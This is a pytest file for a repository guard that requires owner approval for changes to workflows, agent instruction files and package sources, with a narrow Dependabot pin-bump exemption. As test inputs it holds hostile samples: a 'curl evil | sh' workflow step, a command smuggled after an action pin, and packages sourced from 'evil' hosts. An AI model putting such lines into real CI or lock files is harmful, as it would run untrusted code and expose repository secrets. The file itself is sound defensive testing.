"""The guard's decision rules: what counts as guarded, who may approve, what is exempt."""

import pytest

from ghapi.identities import DEPENDABOT_ID, OWNER_ID
from guard.rules import (
    ChangedFile,
    PullRequest,
    Review,
    Snapshot,
    evaluate,
    is_guarded_path,
    lock_sources_changed,
    pin_update_repos,
    uv_config_changed,
)

OWNER = OWNER_ID
DEPENDABOT = DEPENDABOT_ID
HEAD = "h" * 40
OLD = "a" * 40
NEW = "b" * 40


# --- guarded paths ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        ".github/workflows/ci.yml",
        ".github/scripts/guard/rules.py",
        ".github/dependabot.yml",
        ".claude/settings.json",
        "src/pkg/.claude/commands/x.md",
        "REVIEW.md",
        "docs/REVIEW.md",
        "AGENTS.md",
        "CLAUDE.md",
        "docs/agents/issue-tracker.md",
        "docs/adr/0005-x.md",
        ".mcp.json",
        "release-please-config.json",
        ".release-please-manifest.json",
        ".gitattributes",
        ".gitmodules",
        ".python-version",
        "uv.toml",
    ],
)
def test_guarded_paths(path: str) -> None:
    assert is_guarded_path(path)


@pytest.mark.parametrize(
    "path",
    [
        "src/book_translator/__init__.py",
        "tests/test_smoke.py",
        "README.md",
        "docs/history.md",
        "docs/adr-notes.md",
        "pyproject.toml",
        "uv.lock",
        "notes/AGENTS.md.txt",
        "githubby/file.txt",
    ],
)
def test_unguarded_paths(path: str) -> None:
    assert not is_guarded_path(path)


@pytest.mark.parametrize(
    "path",
    [".GitHub/workflows/ci.yml", "agents.md", "Docs/ADR/x.md", ".PYTHON-VERSION"],
)
def test_matching_ignores_case_because_checkouts_may(path: str) -> None:
    assert is_guarded_path(path)


@pytest.mark.parametrize("path", ["", "/etc/passwd", "a/../.github/x", "a\\b", "./AGENTS.md"])
def test_odd_paths_fail_closed(path: str) -> None:
    assert is_guarded_path(path)


# --- Dependabot pin updates --------------------------------------------------------------------


def _patch(*pairs: tuple[str, str]) -> str:
    lines = ["@@ -10,3 +10,3 @@ jobs:", "     steps:"]
    for old, new in pairs:
        lines += [f"-{old}", f"+{new}"]
    return "\n".join(lines)


def _uses(repo: str, sha: str, comment: str) -> str:
    return f"      - uses: {repo}@{sha} # {comment}"


def test_pin_bump_is_recognised() -> None:
    patch = _patch(
        (_uses("actions/checkout", OLD, "v4.4.0"), _uses("actions/checkout", NEW, "v4.5.0"))
    )
    assert pin_update_repos(patch) == frozenset({"actions/checkout"})


def test_several_pin_bumps() -> None:
    patch = _patch(
        (_uses("actions/checkout", OLD, "v4.4.0"), _uses("actions/checkout", NEW, "v4.5.0")),
        (_uses("astral-sh/setup-uv", OLD, "v6.8.0"), _uses("astral-sh/setup-uv", NEW, "v6.9.0")),
    )
    assert pin_update_repos(patch) == frozenset({"actions/checkout", "astral-sh/setup-uv"})


@pytest.mark.parametrize(
    "old,new",
    [
        # a different action
        (_uses("actions/checkout", OLD, "v4"), _uses("evil/checkout", NEW, "v4")),
        # not a pin: a branch ref
        (_uses("actions/checkout", OLD, "v4"), "      - uses: actions/checkout@main"),
        # an extra step smuggled into the same line
        (
            _uses("actions/checkout", OLD, "v4"),
            f"      - uses: actions/checkout@{NEW}; curl x # v4",
        ),
        # a different key
        (_uses("actions/checkout", OLD, "v4"), "      - run: actions/checkout@" + NEW),
        # a changed indent (structure change)
        (_uses("actions/checkout", OLD, "v4"), "  " + _uses("actions/checkout", NEW, "v4")),
        # a non-pin line altogether
        ("      - run: echo hi", "      - run: echo evil"),
    ],
)
def test_anything_beyond_a_pin_bump_is_not_exempt(old: str, new: str) -> None:
    assert pin_update_repos(_patch((old, new))) is None


def test_added_or_removed_lines_are_not_exempt() -> None:
    added = "@@ -1,1 +1,2 @@\n     a\n+      - run: curl evil | sh"
    removed = "@@ -1,2 +1,1 @@\n     a\n-      - run: echo hi"
    assert pin_update_repos(added) is None
    assert pin_update_repos(removed) is None


def test_missing_patch_is_not_exempt() -> None:
    assert pin_update_repos(None) is None
    assert pin_update_repos("") is None


# --- uv configuration and lock sources ------------------------------------------------------

BASE_PYPROJECT = """
[project]
name = "x"
dependencies = []

[build-system]
requires = ["uv_build>=0.11.21,<0.12.0"]
build-backend = "uv_build"

[tool.uv]
exclude-newer = "7 days"

[tool.ruff]
line-length = 100
"""


def test_unrelated_pyproject_edits_are_fine() -> None:
    head = BASE_PYPROJECT.replace("line-length = 100", "line-length = 88").replace(
        "dependencies = []", 'dependencies = ["requests"]'
    )
    assert not uv_config_changed(BASE_PYPROJECT, head)


def test_tool_uv_change_is_guarded() -> None:
    assert uv_config_changed(BASE_PYPROJECT, BASE_PYPROJECT.replace("7 days", "0 days"))


def test_tool_uv_subtable_is_guarded() -> None:
    head = BASE_PYPROJECT + '\n[tool.uv.sources]\nx = { git = "https://evil/x" }\n'
    assert uv_config_changed(BASE_PYPROJECT, head)


def test_build_system_change_is_guarded() -> None:
    assert uv_config_changed(BASE_PYPROJECT, BASE_PYPROJECT.replace("uv_build", "evil_build"))


def test_pyproject_added_or_removed_or_unparseable_is_guarded() -> None:
    assert uv_config_changed(None, BASE_PYPROJECT)
    assert uv_config_changed(BASE_PYPROJECT, None)
    assert uv_config_changed(BASE_PYPROJECT, "this is [not toml")


LOCK = """
version = 1

[[package]]
name = "pytest"
version = "9.2.0"
source = {{ registry = "https://pypi.org/simple" }}
sdist = {{ url = "{host}/pytest-9.2.0.tar.gz", hash = "sha256:aa" }}
wheels = [{{ url = "{host}/pytest-9.2.0-py3-none-any.whl", hash = "sha256:bb" }}]

[[package]]
name = "book-translator"
version = "0.1.0"
source = {{ editable = "." }}
"""
PYPI = "https://files.pythonhosted.org/packages/aa"


def _lock(host: str = PYPI, extra: str = "") -> str:
    return LOCK.format(host=host) + extra


def test_a_version_bump_in_the_lock_is_fine() -> None:
    head = (
        _lock().replace('version = "9.2.0"', 'version = "9.3.0"').replace("sha256:aa", "sha256:cc")
    )
    assert not lock_sources_changed(_lock(), head)


def test_a_new_package_from_the_same_registry_is_fine() -> None:
    extra = """
[[package]]
name = "requests"
version = "2.0.0"
source = { registry = "https://pypi.org/simple" }
wheels = [{ url = "https://files.pythonhosted.org/packages/bb/r.whl", hash = "sha256:dd" }]
"""
    assert not lock_sources_changed(_lock(), _lock(extra=extra))


@pytest.mark.parametrize(
    "extra",
    [
        '\n[[package]]\nname = "x"\nversion = "1"\nsource = { git = "https://evil/x" }\n',
        '\n[[package]]\nname = "x"\nversion = "1"\nsource = { registry = "https://evil/simple" }\n',
        '\n[[package]]\nname = "x"\nversion = "1"\nsource = { url = "https://evil/x.whl" }\n',
        '\n[[package]]\nname = "x"\nversion = "1"\nsource = { path = "../x" }\n',
    ],
)
def test_new_lock_source_is_guarded(extra: str) -> None:
    assert lock_sources_changed(_lock(), _lock(extra=extra))


def test_artifact_url_on_a_new_host_is_guarded() -> None:
    assert lock_sources_changed(_lock(), _lock(host="https://evil.example/packages"))


def test_unparseable_or_added_lock_is_guarded() -> None:
    assert lock_sources_changed(_lock(), "not [toml")
    assert lock_sources_changed(None, _lock())
    assert lock_sources_changed(_lock(), None)


# --- the decision ---------------------------------------------------------------------------


def _pr(author: int = 999, head_repo: str = "o/r", head_ref: str = "feature") -> PullRequest:
    return PullRequest(
        number=1,
        author_id=author,
        base_repo="o/r",
        head_repo=head_repo,
        head_ref=head_ref,
        head_sha=HEAD,
    )


def _file(
    path: str,
    status: str = "modified",
    patch: str | None = "@@ x @@",
    previous: str | None = None,
) -> ChangedFile:
    return ChangedFile(path=path, status=status, patch=patch, previous_path=previous)


SNAP = Snapshot(
    pyproject_base=BASE_PYPROJECT,
    pyproject_head=BASE_PYPROJECT,
    lock_base=_lock(),
    lock_head=_lock(),
    symlinks=frozenset(),
)


def test_unguarded_change_passes_for_anyone() -> None:
    verdict = evaluate(_pr(), [_file("src/a.py")], [], SNAP)
    assert verdict.passed
    assert not verdict.reasons


def test_guarded_change_by_a_stranger_waits() -> None:
    verdict = evaluate(_pr(), [_file(".github/workflows/ci.yml")], [], SNAP)
    assert not verdict.passed
    assert any(".github/workflows/ci.yml" in r for r in verdict.reasons)


def test_guarded_rename_out_of_a_guarded_path_counts() -> None:
    f = _file("notes/x.md", status="renamed", previous="docs/adr/0001.md")
    assert not evaluate(_pr(), [f], [], SNAP).passed


def test_guarded_deletion_counts() -> None:
    assert not evaluate(_pr(), [_file("AGENTS.md", status="removed")], [], SNAP).passed


def _review(user: int, state: str, commit: str = HEAD) -> Review:
    return Review(user_id=user, state=state, commit_id=commit)


GUARDED = [_file("AGENTS.md")]


def test_owner_approval_on_the_head_commit_passes() -> None:
    assert evaluate(_pr(), GUARDED, [_review(OWNER, "APPROVED")], SNAP).passed


def test_owner_approval_of_an_older_commit_does_not_count() -> None:
    reviews = [_review(OWNER, "APPROVED", commit="z" * 40)]
    assert not evaluate(_pr(), GUARDED, reviews, SNAP).passed


def test_someone_elses_approval_does_not_count() -> None:
    assert not evaluate(_pr(), GUARDED, [_review(123, "APPROVED")], SNAP).passed


def test_a_later_change_request_by_the_owner_cancels_the_approval() -> None:
    reviews = [_review(OWNER, "APPROVED"), _review(OWNER, "CHANGES_REQUESTED")]
    assert not evaluate(_pr(), GUARDED, reviews, SNAP).passed


def test_a_later_comment_does_not_cancel_the_approval() -> None:
    reviews = [_review(OWNER, "APPROVED"), _review(OWNER, "COMMENTED")]
    assert evaluate(_pr(), GUARDED, reviews, SNAP).passed


def test_a_dismissed_approval_does_not_count() -> None:
    assert not evaluate(_pr(), GUARDED, [_review(OWNER, "DISMISSED")], SNAP).passed


def test_a_pr_authored_by_the_owner_from_this_repo_passes() -> None:
    assert evaluate(_pr(author=OWNER), GUARDED, [], SNAP).passed


def test_a_pr_from_a_fork_never_gets_the_author_pass() -> None:
    assert not evaluate(_pr(author=OWNER, head_repo="fork/r"), GUARDED, [], SNAP).passed


def test_a_fork_pr_can_still_be_approved() -> None:
    pr = _pr(head_repo="fork/r")
    assert evaluate(pr, GUARDED, [_review(OWNER, "APPROVED")], SNAP).passed


# --- Dependabot exemption inside the decision ---------------------------------------------


def _bump_file(repo: str = "actions/checkout") -> ChangedFile:
    patch = _patch((_uses(repo, OLD, "v1"), _uses(repo, NEW, "v2")))
    return _file(".github/workflows/ci.yml", patch=patch)


def _dependabot(**kw: str) -> PullRequest:
    return _pr(author=DEPENDABOT, head_ref=kw.get("head_ref", "dependabot/github_actions/x"))


def test_dependabot_pin_bump_in_a_workflow_is_exempt() -> None:
    assert evaluate(_dependabot(), [_bump_file()], [], SNAP).passed


def test_the_exemption_needs_dependabots_numeric_id() -> None:
    pr = _pr(author=111, head_ref="dependabot/github_actions/x")
    assert not evaluate(pr, [_bump_file()], [], SNAP).passed


def test_the_exemption_needs_a_dependabot_branch() -> None:
    assert not evaluate(_dependabot(head_ref="feature"), [_bump_file()], [], SNAP).passed


def test_the_exemption_needs_the_head_in_this_repo() -> None:
    pr = _pr(author=DEPENDABOT, head_repo="fork/r", head_ref="dependabot/x")
    assert not evaluate(pr, [_bump_file()], [], SNAP).passed


@pytest.mark.parametrize(
    "repo",
    [
        "actions/create-github-app-token",
        "anthropics/claude-code-action",
        "googleapis/release-please-action",
        "dependabot/fetch-metadata",
        "anthropics/claude-code-action/base-action",
        "Actions/Create-Github-App-Token",
        "GoogleAPIs/release-please-action",
        "actions/create-github-app-token/sub",
    ],
)
def test_bumps_of_secret_handling_actions_need_the_owner(repo: str) -> None:
    assert not evaluate(_dependabot(), [_bump_file(repo)], [], SNAP).passed


def test_a_dependabot_edit_that_is_not_a_pure_bump_needs_the_owner() -> None:
    f = _file(".github/workflows/ci.yml", patch="@@ -1 +1 @@\n-      - run: a\n+      - run: b")
    assert not evaluate(_dependabot(), [f], [], SNAP).passed


def test_a_dependabot_pr_cannot_use_the_exemption_for_other_guarded_files() -> None:
    assert not evaluate(_dependabot(), [_bump_file(), _file("AGENTS.md")], [], SNAP).passed


def test_a_dependabot_added_workflow_is_not_exempt() -> None:
    f = _bump_file()
    added = ChangedFile(path=f.path, status="added", patch=f.patch, previous_path=None)
    assert not evaluate(_dependabot(), [added], [], SNAP).passed


def test_a_dependabot_edit_to_the_dependabot_config_is_not_exempt() -> None:
    f = _file(".github/dependabot.yml", patch=_bump_file().patch)
    assert not evaluate(_dependabot(), [f], [], SNAP).passed


# --- symlinks and uv configuration inside the decision ---------------------------------------


def test_a_changed_symlink_is_guarded() -> None:
    snap = Snapshot(None, None, None, None, symlinks=frozenset({"src/link"}))
    assert not evaluate(_pr(), [_file("src/link")], [], snap).passed


def test_pyproject_edit_touching_tool_uv_is_guarded() -> None:
    snap = Snapshot(
        BASE_PYPROJECT, BASE_PYPROJECT.replace("7 days", "0 days"), None, None, frozenset()
    )
    assert not evaluate(_pr(), [_file("pyproject.toml")], [], snap).passed


def test_pyproject_edit_elsewhere_is_fine() -> None:
    head = BASE_PYPROJECT.replace("line-length = 100", "line-length = 88")
    snap = Snapshot(BASE_PYPROJECT, head, None, None, frozenset())
    assert evaluate(_pr(), [_file("pyproject.toml")], [], snap).passed


def test_lock_edit_with_a_new_source_is_guarded() -> None:
    extra = '\n[[package]]\nname = "x"\nversion = "1"\nsource = { git = "https://evil/x" }\n'
    snap = Snapshot(None, None, _lock(), _lock(extra=extra), frozenset())
    assert not evaluate(_pr(), [_file("uv.lock")], [], snap).passed


def test_lock_version_bump_is_fine() -> None:
    head = _lock().replace('version = "9.2.0"', 'version = "9.3.0"')
    snap = Snapshot(None, None, _lock(), head, frozenset())
    assert evaluate(_pr(), [_file("uv.lock")], [], snap).passed
